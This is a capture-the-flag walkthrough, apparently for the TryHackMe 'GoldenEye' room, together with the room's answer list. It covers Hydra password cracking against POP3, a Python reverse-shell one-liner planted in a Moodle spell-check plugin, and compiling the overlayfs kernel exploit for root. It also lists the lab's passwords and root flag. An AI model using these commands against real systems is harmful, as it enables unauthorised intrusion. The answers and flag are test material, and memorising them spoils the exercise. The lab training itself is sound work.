# Golden-Eye-Writeup by Brandon Gerber 

Task 1: Intro and Enumeration

I began by scanning the target machine using nmap to identify open ports:
nmap -n -v -sT -p- -T5 'IP'
This revealed 4 open ports. 

I decided to check the source code of the website found some comments:
// contacting a user named boris
// left encoded password
// mentioned another person named Natalya
Based on the context, I assumed "boris" was a username, 
and I found an encoded password in the comments: &#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
Using an HTML decoder, I decoded it to:InvincibleHack3r
Know learning, i could have just used dcode<pw>

Task 2: It’s Mail Time
Next, I tried logging in via telnet to the POP3 service on port 55007, but the credentials failed. The next hint was to use Hydra to crack the password:
hydra -l boris -P <path_to_password_list> <IP> -s 55007 pop3
This successfully found the password:
Password: secret1!

I then logged in via telnet:
telnet <IP> 55007
user boris
pass secret1!
After logging in, I listed and retrieved the emails to retrieve the emails i used retr<email num>, revealing another username, "Xenia."

Using Hydra again, I cracked Xenia’s password:
hydra -l Xenia -P <path_to_password_list> <IP> -s 55007 pop3
The password was bird. After logging into her account, I found her new password: RCP90rulez. 

This led me to the next hint regarding the severnaya-station.com website. I added it to my /etc/hosts file to access it:
make sure to nano /etc/hosts and add <IP> severnaya-station.com
I visited http://severnaya-station.com/gnocertdir/ and used Xenia's credentials to log in: (this was after attemping boris)
user: Xenia
pass: RCP90rulez!
Under "My Profile," I found a message from Dr. Doak revealing his creds

hydra -l Doak -P <path_to_wordlist> <IP> -s 55007 pop3
Password: goat

Using telnet again, I found his password in an email: 4England!

Task 3: Gaining Access
Logging in with Dr. Doak's credentials (dr_doak, 4England!), I explored his private files and discovered a file named s3cret.txt, which mentioned the location of an image at /dir007key/for-007.jpg. I downloaded the image using wget and extracted hidden information with exiftool. Inside the description field,

I found a Base64 string:
eFdpbnRlckE50TV4IQ==
Decoded, it revealed: xWinter1995x!

user: admin
pass: xWinter1995x!

Task 4: Exploitation
I created a reverse shell using Python:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>", <Port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
I inserted this script into the spell check plugin on the website,

then started a listener using pwncat:
pwncat --listen -p 9999
This granted me a shell on the system. The kernel version was 3.13.0-32-generic, and I found an overlayfs privilege escalation exploit (https://www.exploit-db.com/exploits/37292).

I compiled and executed the exploit:
upload exploit.c /tmp
cd /tmp
cc exploit.c -o exploit
./exploit
This gave me root access. I navigated to the /root directory and found the final flag:

cat flag.txt
Root flag: 568628e0d993b1973adc718237da6e93

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
ANSWERS 
Answer the questions below
First things first, connect to our network and deploy the machine.

No answer needed
Correct Answer
Use nmap to scan the network for all ports. How many ports are open?

4
Correct Answer
Hint
Take a look on the website, take a dive into the source code too and remember to inspect all scripts!

No answer needed
Correct Answer
Who needs to make sure they update their default password?

boris
Correct Answer
Whats their password?

InvincibleHack3r
Correct Answer
Now go use those credentials and login to a part of the site.

No answer needed
Correct Answer

Task 2:
Onto the next steps.. 

Answer the questions below
Take a look at some of the other services you found using your nmap scan. Are the credentials you have re-usable? 

No answer needed
Correct Answer
If those creds don't seem to work, can you use another program to find other users and passwords? Maybe Hydra?Whats their new password?

secret1!
Correct Answer
Hint
Inspect port 55007, what services is configured to use this port?

telnet
Correct Answer
Login using that service and the credentials you found earlier.

No answer needed
Correct Answer
What can you find on this service?

emails
Correct Answer
What user can break Boris' codes?

natalya
Correct Answer
Using the users you found on this service, find other users passwords

No answer needed
Correct Answer
Keep enumerating users using this service and keep attempting to obtain their passwords via dictionary attacks.

No answer needed
Correct Answer
Hint

Task 3: 
Enumeration really is key. Making notes and referring back to them can be lifesaving. We shall now go onto getting a user shell.

Answer the questions below
If you remembered in some of the emails you discovered, there is the severnaya-station.com website. To get this working, you need up update your DNS records to reveal it.

If you're on Linux edit your "/etc/hosts" file and add:

<machines ip> severnaya-station.com

If you're on Windows do the same but in the "c:\Windows\System32\Drivers\etc\hosts" file

No answer needed
Correct Answer
Once you have done that, in your browser navigate to: http://severnaya-station.com/gnocertdir

No answer needed
Correct Answer
Try using the credentials you found earlier. Which user can you login as?

xenia
Correct Answer
Have a poke around the site. What other user can you find?

doak
Correct Answer
What was this users password?

goat
Correct Answer
Hint
Use this users credentials to go through all the services you have found to reveal more emails.

No answer needed
Correct Answer
What is the next user you can find from doak?

dr_doak
Correct Answer
Hint
What is this users password?

4England!
Correct Answer
Take a look at their files on the moodle (severnaya-station.com)

No answer needed
Correct Answer
Download the attachments and see if there are any hidden messages inside them?

No answer needed
Correct Answer
Hint
Using the information you found in the last task, login with the newly found user.

No answer needed
Correct Answer
As this user has more site privileges, you are able to edit the moodles settings. From here get a reverse shell using python and netcat.

Take a look into Aspell, the spell checker plugin.

No answer needed
Correct Answer
Hint

Task 4: 
Now that you have enumerated enough to get an administrative moodle login and gain a reverse shell, its time to priv esc.

Answer the questions below
Download the linuxprivchecker to enumerate installed development tools.

To get the file onto the machine, you will need to wget your local machine as the VM will not be able to wget files on the internet. Follow the steps to get a file onto your VM:

Download the linuxprivchecker file locally
Navigate to the file on your file system
Do: python -m SimpleHTTPServer 1337 (leave this running)
On the VM you can now do: wget <your IP>/<file>.py
OR

Enumerate the machine manually.

No answer needed
Correct Answer
Whats the kernel version?

3.13.0-32-generic
Correct Answer
Hint
This machine is vulnerable to the overlayfs exploit. The exploitation is technically very simple:

Create new user and mount namespace using clone with CLONE_NEWUSER|CLONE_NEWNS flags.
Mount an overlayfs using /bin as lower filesystem, some temporary directories as upper and work directory.
Overlayfs mount would only be visible within user namespace, so let namespace process change CWD to overlayfs, thus making the overlayfs also visible outside the namespace via the proc filesystem.
Make su on overlayfs world writable without changing the owner
Let process outside user namespace write arbitrary content to the file applying a slightly modified variant of the SetgidDirectoryPrivilegeEscalation exploit.
Execute the modified su binary
You can download the exploit from here: https://www.exploit-db.com/exploits/37292

No answer needed
Correct Answer
Fix the exploit to work with the system you're trying to exploit. Remember, enumeration is your key!

What development tools are installed on the machine?
No answer needed
Correct Answer


What is the root flag?
568628e0d993b1973adc718237da6e93
Correct Answer
